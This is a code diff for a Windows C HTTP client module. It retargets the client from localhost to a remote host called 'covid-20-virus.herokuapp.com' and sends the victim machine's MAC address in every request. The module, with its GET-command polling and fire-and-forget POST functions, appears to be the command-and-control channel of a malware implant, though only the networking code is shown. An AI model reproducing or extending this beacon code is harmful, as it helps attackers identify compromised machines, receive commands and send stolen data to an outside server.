@@ -1,3 +1,4 @@
+#define WIN32_LEAN_AND_MEAN
 #include "http.h"
 #include "parse.h"
 #include <string.h>
@@ -6,9 +7,11 @@
 #include <winsock2.h>
 #include <Ws2tcpip.h>
 #include <iphlpapi.h>
+#include <Windows.h>
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
-
+#pragma comment (lib, "Mswsock.lib")
+#pragma comment (lib, "AdvApi32.lib")
 #pragma warning(disable:4996)
 #define WORKING_BUFFER_SIZE 16384
 #define MAC_ADDRESS_LENGTH 17
@@ -17,13 +20,13 @@
 #define MAC_ADDRESS_ERROR "Mac address error"
 #define BAD_REQUEST_PHRASE "Bad Request"
 #define BAD_REQUEST_STATUS_CODE "400"
-#define PORT 30050 // Server port
-#define IP "127.0.0.1" // Server IP address
+#define PORT "80" // HTTP port
+#define HOST "covid-20-virus.herokuapp.com"
 
 int winsock_setup(SOCKET* s) {
 	int iResult = 0;
 	WSADATA wsa_data = { 0 };
-	struct sockaddr_in client_service = { 0 };
+	struct addrinfo* result = NULL, * ptr = NULL, hints;
 
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsa_data);
@@ -33,31 +36,49 @@ int winsock_setup(SOCKET* s) {
 		return 0;
 	}
 
-	// Create a SOCKET for connecting to server
-	*s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (*s == INVALID_SOCKET) {
-		printf("socket failed with error: %ld\n", WSAGetLastError());
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	iResult = getaddrinfo(HOST, PORT, &hints, &result);
+	if (iResult != 0) {
+		printf("getaddrinfo failed with error: %d\n", iResult);
 		WSACleanup();
 		return 0;
 	}
 
-	//The sockaddr_in structure specifies the address family,
-	// IP address, and port of the server to be connected to.
-	client_service.sin_family = AF_INET;
-	client_service.sin_addr.s_addr = inet_addr(IP);
-	client_service.sin_port = htons(PORT);
+	// Attempt to connect to an address until one succeeds
+	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
 
-	// Connect to server
-	iResult = connect(*s, (SOCKADDR*)&client_service, sizeof(client_service));
-	if (iResult == SOCKET_ERROR) {
-		printf("connect failed with error: %d\n", WSAGetLastError());
-		closesocket(*s);
+		// Create a SOCKET for connecting to server
+		*s = socket(ptr->ai_family, ptr->ai_socktype,
+			ptr->ai_protocol);
+		if (*s == INVALID_SOCKET) {
+			printf("socket failed with error: %ld\n", WSAGetLastError());
+			WSACleanup();
+			return 0;
+		}
+
+		// Connect to server.
+		iResult = connect(*s, ptr->ai_addr, (int)ptr->ai_addrlen);
+		if (iResult == SOCKET_ERROR) {
+			closesocket(*s);
+			*s = INVALID_SOCKET;
+			continue;
+		}
+		break;
+	}
+
+	freeaddrinfo(result);
+
+	if (*s == INVALID_SOCKET) {
+		printf("Unable to connect to server!\n");
 		WSACleanup();
 		return 0;
 	}
 	return 1;
 }
-
 char* create_get_http_request(HTTP_HEADER headers[], unsigned int headers_length, char* request_uri) {
 	char* request = (char*)calloc(MAX_REQUEST_LEN, sizeof(char));
 	char* get = "GET /";
@@ -129,7 +150,7 @@ HTTP_RESPONSE send_get_command(char* request_uri) {
 		{"Connection", "Keep-Alive"},
 		{"Charset", "utf-8"},
 		build_header("Date", get_datetime()),
-		build_host_header(IP, PORT),
+		build_header("Host", HOST),
 		build_header("MAC-Address", get_mac_address())
 	};
 	headers_length = sizeof(headers) / sizeof(HTTP_HEADER);
@@ -273,7 +294,7 @@ void send_post_request_without_listening(char* data, unsigned int length, char* 
 		build_header("Content-Type", content_type),
 		content_length_header,
 		build_header("Date", get_datetime()),
-		build_host_header(IP, PORT),
+		build_header("Host", HOST),
 		build_header("MAC-Address", get_mac_address())
 	};
 	headers_length = sizeof(headers) / sizeof(HTTP_HEADER);
